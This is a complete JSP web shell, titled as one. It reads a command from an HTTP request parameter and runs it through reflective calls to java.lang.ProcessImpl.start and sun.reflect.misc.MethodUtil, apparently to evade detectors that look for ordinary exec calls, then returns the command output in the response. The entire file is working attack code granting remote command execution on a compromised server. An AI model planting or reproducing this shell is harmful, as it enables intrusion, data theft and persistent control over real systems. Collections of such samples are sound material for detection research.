<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>java.lang.ProcessImpl JSP Webshell</h2>
<%
    try {
        final String s = request.getParameter("threedr3am");
        class A {

            B b;

            final class B {

                private Method o;
                private Object oo;
                private Object[] ooo;

                public B() throws ClassNotFoundException, NoSuchMethodException {
                    Class clz = Class.forName("java.lang.ProcessImpl");
                    Method method = clz
                            .getDeclaredMethod("start", String[].class, Map.class, String.class,
                                    ProcessBuilder.Redirect[].class, boolean.class);
                    method.setAccessible(true);
                    o = method;
                    oo = clz;
                    ooo = new Object[]{s.split(" "), null, null, null, false};
                }
            }

            public A() throws ClassNotFoundException, NoSuchMethodException {
                b = new B();
            }

            public Object invokex()
                    throws InvocationTargetException, IllegalAccessException {
                return MethodUtil.invoke(b.o, b.oo, b.ooo);
            }
        }

        Process process = (Process) new A().invokex();
        InputStream inputStream = process.getInputStream();
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        if (stringBuilder.length() > 0) {
            response.getOutputStream().write(stringBuilder.toString().getBytes());
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>